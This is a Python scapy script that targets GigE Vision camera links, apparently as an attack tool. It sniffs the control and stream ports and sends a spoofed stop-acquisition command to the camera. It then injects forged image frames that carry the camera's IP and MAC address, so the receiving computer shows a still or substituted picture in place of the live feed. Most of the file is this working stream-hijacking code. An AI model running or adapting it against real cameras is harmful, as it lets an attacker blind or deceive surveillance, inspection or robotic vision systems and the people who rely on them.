# -*- coding: utf-8 -*-
import cv2
import matplotlib.pyplot as plt
import numpy as np
from typing import List
from scapy.packet import Packet,bind_layers
from scapy.fields import *
from scapy.layers.inet import UDP,IP, Ether
from scapy.plist import PacketList
from scapy.all import sniff ,sendp, sendpfast, rdpcap, Raw, PcapWriter,\
     PacketListField, StrNullField, ConditionalField, Padding
from scapy.all import hexdump
import time
from enum import IntEnum, Enum


class GigERegisters(IntEnum):
    ACQUISITION = 0x000130f4

class Method(Enum):
    WINDOWS_VIMBA = 1
    WINDOWS_MATLAB_REC = 2
    WINDOWS_MATLAB_PREVIEW = 3
    LINUX_ROS = 4


# CONSTANTS
GVSP_SRC_PORT = 10010
GVCP_DST_PORT = 3956
BYTES_PER_PIXEL = 1
BYTE = 8
IP_LAYER = 'IP'
UDP_LAYER = 'UDP'
GVSP_LAYER = 'Gvsp'
GVCP_LAYER = 'GvcpCmd'

# PARAMETERS
method = Method.WINDOWS_VIMBA
camera_mac = '00:0f:31:03:67:c4'
cp_mac = '00:18:7d:c8:e6:31'

if method == Method.WINDOWS_VIMBA:
    interface = 'Ethernet 6'
    cp_ip = '192.168.1.100'
    camera_ip = '192.168.10.150'
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8963
elif method == Method.WINDOWS_MATLAB_REC:
    interface = 'Ethernet 6'
    cp_ip = '192.168.1.100'
    camera_ip = '192.168.0.1'
    img_width = 1920
    img_height = 1080
    max_payload_bytes = 8950
elif method == Method.WINDOWS_MATLAB_PREVIEW:
    interface = 'Ethernet 6'
    cp_ip = '192.168.1.100'
    camera_ip = '192.168.0.1'
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8950
elif method == Method.LINUX_ROS:
    interface = 'enp1s0'

default_request_id = 1
default_block_id = 1

gvcp_excluded_ports = [58732]


class GvcpCmd(Packet):
    name = "GVCP_CMD"
    fields_desc=[XBitField("MessageKeyCode",0x42,BYTE),
                 XBitField("Flags",0x01,BYTE),
                 XShortEnumField("Command",None,{0x0080:"READREG_CMD",0x0081:"READREG_ACK",0x0082:"WRITEREG_CMD"}),
                 ShortField("PayloadLength",0x0008),
                 ShortField("RequestID",1),
                 XBitField("RegisterAddress",0x000130f4,4*BYTE),
                 IntField("value",None)
                 ]
bind_layers(UDP,GvcpCmd,dport=GVCP_DST_PORT)

class GvspLeader(Packet):
    name = "GVSP_LEADER"
    fields_desc = [ShortField("FieldInfo",0),
                    ShortField("PayloadType",0x0001),
                    XBitField("Timestamp",1,8*BYTE),
                    XBitField("PixelFormat",0x01080009,4*BYTE),
                    IntField("SizeX",img_width),
                    IntField("SizeY",img_height),
                    IntField("OffsetX",0),
                    IntField("OffsetY",0),
                    ShortField("PaddingX",0),
                    ShortField("PaddingY",0)
                  ]
    
class GvspTrailer(Packet):
    name = "GVSP_TRAILER"
    fields_desc = [ShortField("FieldInfo",0),
                    ShortField("PayloadType",0x0001),
                    IntField("SizeY",img_height)]
                    # ShortField("UnknownPadding", 0x5555)] #TODO check why originally there is padding 5555 for the UDP

class Gvsp(Packet):
    name = "GVSP"
    fields_desc=[XBitField("Status",0x0000,2*BYTE),
                 ShortField("BlockID",0),
                 XByteEnumField("Format",None,{0x01:"LEADER",0x02:"TRAILER",0x03:"PAYLOAD"}),
                 XBitField("PacketID",0x000000,3*BYTE),
                ]
bind_layers(UDP,Gvsp,sport=GVSP_SRC_PORT)
bind_layers(Gvsp,GvspLeader,Format=1)
bind_layers(Gvsp,GvspTrailer,Format=2)

    
class GigELink():
    def __init__(self, interface: str, cp_ip: str=cp_ip, camera_ip: str=camera_ip, img_width: int=img_width, img_height: int=img_height,max_payload_bytes: int=max_payload_bytes):
        self.interface = interface 
        self.cp_ip = cp_ip
        self.camera_ip = camera_ip
        self.img_width = img_width
        self.img_height = img_height
        self.max_payload_bytes = max_payload_bytes
        self.gvsp_dst_port = -1
        self.gvcp_src_port = -1
        self.last_block_id = default_block_id - 1

    def set_gvsp_dst_port(self,  gvsp_dst_port):
        self.gvsp_dst_port = gvsp_dst_port

    def set_gvcp_src_port(self,gvcp_src_port):
         self.gvcp_src_port = gvcp_src_port

    def print_link(self):
        print('GVCP:')
        print(f'CP {self.cp_ip}({self.gvcp_src_port}) ---> Camera {self.camera_ip}({GVCP_DST_PORT})')
        print('GVSP:')
        print(f'Camera {self.camera_ip}({GVSP_SRC_PORT}) ---> CP {self.cp_ip}({self.gvsp_dst_port})')

    def _get_aquisition_cmd(self, reg_val):
        cmd = Ether(src=cp_mac,dst=camera_mac)/IP(
            src=self.cp_ip,dst=self.camera_ip)/UDP(sport= self.gvcp_src_port,dport=GVCP_DST_PORT)/GvcpCmd(
                Command="WRITEREG_CMD", Flags=0x00, RegisterAddress=GigERegisters.ACQUISITION.value, value=reg_val, RequestID=default_request_id)
        return cmd

    def send_stop_command(self, count=1):
        cmd = self._get_aquisition_cmd(reg_val=0)
        sendp(cmd, iface=self.interface, count=count, verbose=False)  
        
    def send_start_command(self, count=1):
        cmd = self._get_aquisition_cmd(reg_val=1)
        sendp(cmd, iface=self.interface, count=count, verbose=False)
         
    def sniff_link_parameters(self):
        def pkt_callback(pkt):
            gvsp_port_found = self.gvsp_dst_port != -1
            gvcp_port_found = self.gvcp_src_port != -1    

            if not gvsp_port_found and pkt.haslayer(GVSP_LAYER) and pkt[IP_LAYER].src==self.camera_ip:
                gvsp_dst_port = pkt[UDP_LAYER].dport
                self.set_gvsp_dst_port(gvsp_dst_port)
                print(f'Found GVSP port {gvsp_dst_port}')
            elif not gvcp_port_found and pkt.haslayer("GVCP_CMD") and pkt["GVCP_CMD"].Command==0x0080: #TODO change command 
                if pkt[UDP_LAYER].sport not in gvcp_excluded_ports:
                    gvcp_src_port = pkt[UDP_LAYER].sport
                    self.set_gvcp_src_port(gvcp_src_port)
                    print(f'Found GVCP port {gvcp_src_port}')
            
        def stop_filter(pkt):
            return self.gvsp_dst_port != -1 and  self.gvcp_src_port != -1    
        
        # sniff for ports    
        print('sniffing')
        sniff(iface=self.interface, prn=pkt_callback, filter="udp",stop_filter=stop_filter, store=0)
        self.print_link()

    def sniffing_for_trailer_filter(self, pkt):
            if pkt.haslayer(GVSP_LAYER):
                if pkt[GVSP_LAYER].Format=="TRAILER":
                    return True
            return False
    
    def callback_update_block_id(self,pkt):
         if pkt.haslayer(GVSP_LAYER) and pkt[IP_LAYER].src==self.camera_ip:
            self.last_block_id = pkt[GVSP_LAYER].BlockID

    def stop_and_replace_with_pcap(self, frame_pcap_path, timeout=2):
        print("Stopping acquisition")
        self.send_stop_command(count=1)
        print(f"Sniffing until TRAILER is sent, timeout {timeout} seconds")
        sniff(iface=self.interface, filter="udp",prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=timeout)
        print("Aliasing")
        gvsp_packets = rdpcap(frame_pcap_path)
        for packet in gvsp_packets:
            packet[UDP_LAYER].dport = self.gvsp_dst_port
            packet["IP"].src = self.camera_ip
            packet["IP"].dst = self.cp_ip
        sendp(gvsp_packets, iface=self.interface, verbose=False) 
        self.last_block_id = gvsp_packets[0][GVSP_LAYER].BlockID
        
    def stop_and_replace_with_image(self, img_path, timeout=2):
        print("Stopping acquisition")
        self.send_stop_command(count=1)
        print(f"Sniffing until TRAILER is sent, timeout {timeout} seconds")
        sniff(iface=self.interface, filter="udp",prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=timeout)
        print("Aliasing")
        gvsp_packets = self.img_to_gvsp(img_path,block_id=self.last_block_id+1)
        sendp(gvsp_packets, iface=self.interface, verbose=False) 
        self.last_block_id = gvsp_packets[0][GVSP_LAYER].BlockID

    def img_to_gvsp_using_ref(self, img_path: str, reference_gvsp_pacp: str) -> PacketList:
        img_bgr = cv2.imread(img_path) # BGR
        img_bgr = cv2.resize(img_bgr,(img_width,img_height))
        img_bayer = self.bgr_to_bayer_rg(img_bgr)
        payload = self.img_to_packets_payload(img_bayer)
        gvsp_packets = self.insert_payload_to_gvsp_pcap(payload,reference_gvsp_pacp)
        return gvsp_packets

    def insert_payload_to_gvsp_pcap(self, payload: List[bytes], reference_gvsp_pacp: str, block_id: int=default_block_id) -> PacketList:
        gvsp_packets = rdpcap(reference_gvsp_pacp)
        for pkt,pkt_payload in zip(gvsp_packets[1:-1], payload):
            pkt[GVSP_LAYER].load = pkt_payload
        for pkt in gvsp_packets:
            pkt[UDP_LAYER].src = GVSP_SRC_PORT
            pkt[UDP_LAYER].dst = self.gvsp_dst_port
            pkt[IP_LAYER].src = self.camera_ip
            pkt[IP_LAYER].dst = self.cp_ip
            pkt[GVSP_LAYER].BlockID = block_id
        return gvsp_packets

    def img_to_gvsp(self, img_path: str, save_pcap_debug=True, block_id: int=default_block_id) -> PacketList:
        img_bgr = cv2.imread(img_path) # BGR
        img_bgr = cv2.resize(img_bgr,(self.img_width,self.img_height))
        img_bayer = self.bgr_to_bayer_rg(img_bgr)
        payload = self.img_to_packets_payload(img_bayer)
  
        gvsp_packets = [] 
        packet_id =  0

        leader_packet = Ether(dst=cp_mac,src=camera_mac)/IP(src=self.camera_ip,dst=self.cp_ip)/UDP(
            sport=GVSP_SRC_PORT,dport=self.gvsp_dst_port,chksum=0)/Gvsp(
                BlockID=block_id, Format="LEADER", PacketID=packet_id)/GvspLeader(
                    SizeX=self.img_width, SizeY=self.img_height)
        gvsp_packets.append(leader_packet)
        packet_id += 1
        
        for pkt_payload in payload:
            next_pkt = Ether(dst=cp_mac,src=camera_mac)/IP(src=self.camera_ip,dst=self.cp_ip)/UDP(
            sport=GVSP_SRC_PORT,dport=self.gvsp_dst_port,chksum=0)/Gvsp(
                BlockID=block_id, Format="PAYLOAD", PacketID=packet_id)/Raw(bytes(pkt_payload))
            gvsp_packets.append(next_pkt)
            packet_id += 1

        trailer_packet = Ether(dst=cp_mac,src=camera_mac)/IP(src=self.camera_ip,dst=self.cp_ip)/UDP(
            sport=GVSP_SRC_PORT,dport=self.gvsp_dst_port,chksum=0)/Gvsp(
                BlockID=block_id, Format="TRAILER", PacketID=packet_id)/GvspTrailer(SizeY=self.img_height)
        gvsp_packets.append(trailer_packet)
        packet_id += 1

        gvsp_packets = PacketList(gvsp_packets)
        
        if save_pcap_debug:
            pktdump = PcapWriter('debugging_cfrafted_gvsp.pcap', append=False, sync=True)
            for pkt in gvsp_packets:
                pktdump.write(pkt)
        pktdump.close()  

        return gvsp_packets
        
    def fake_still_image(self, img_path, duration, frame_rate):
        # TODO: read register to get frames rate 
        timeout = 1 # seconds
        print('Sniffing for blockID')
        sniff(iface=self.interface, filter="udp", prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=1)
        print('BlockID found')
        print(f"Stopping acquisition for {duration} seconds with still image")
        self.send_stop_command(count=1)
        print(f"Sniffing until TRAILER is sent, timeout {timeout} seconds")
        sniff(iface=self.interface, filter="udp", prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=timeout)
        print("Faking")
        num_frames = round(duration * frame_rate)        
        print(f'Number of fake frames = {num_frames}')
        print(f'Last GVSP BlockID = {self.last_block_id}')
        # gvsp_fake_packets = []
        aliasing_started = time.time()
        for _ in range(num_frames):
            gvsp_fake_packets = self.img_to_gvsp(img_path, block_id=self.last_block_id+1)
            sendp(gvsp_fake_packets, iface=self.interface, count=1, verbose=False) 
            self.last_block_id =  self.last_block_id + 1
        aliasing_finished = time.time()
        print(f'Faking for {aliasing_finished-aliasing_started} seconds')
        
        print("Starting acquisition")
        self.send_start_command(count=1)

    def bgr_to_bayer_rg(self, img_bgr):
        # note: in open cv I need to read the image as bayer BG to convert it correctly
        (B,G,R) = cv2.split(img_bgr)
        dst_img_bayer = np.empty((self.img_height, self.img_width), np.uint8)
        # strided slicing for this pattern:
        #   R G
        #   G B
        dst_img_bayer[0::2, 0::2] = R[0::2, 0::2] # top left
        dst_img_bayer[0::2, 1::2] = G[0::2, 1::2] # top right
        dst_img_bayer[1::2, 0::2] = G[1::2, 0::2] # bottom left
        dst_img_bayer[1::2, 1::2] = B[1::2, 1::2] # bottom right
        return dst_img_bayer

    def img_to_packets_payload(self,img)->List[bytes]:
        # to bytes
        dst_pixels = img.flatten()
        num_packets = int(np.ceil(len(dst_pixels)/BYTES_PER_PIXEL/self.max_payload_bytes))
        payload_pixels = [dst_pixels[pkt_ind*self.max_payload_bytes:(pkt_ind+1)*self.max_payload_bytes] for pkt_ind in range(num_packets-1)]
        payload_pixels.append(dst_pixels[(num_packets-1)*self.max_payload_bytes:])
        return payload_pixels

    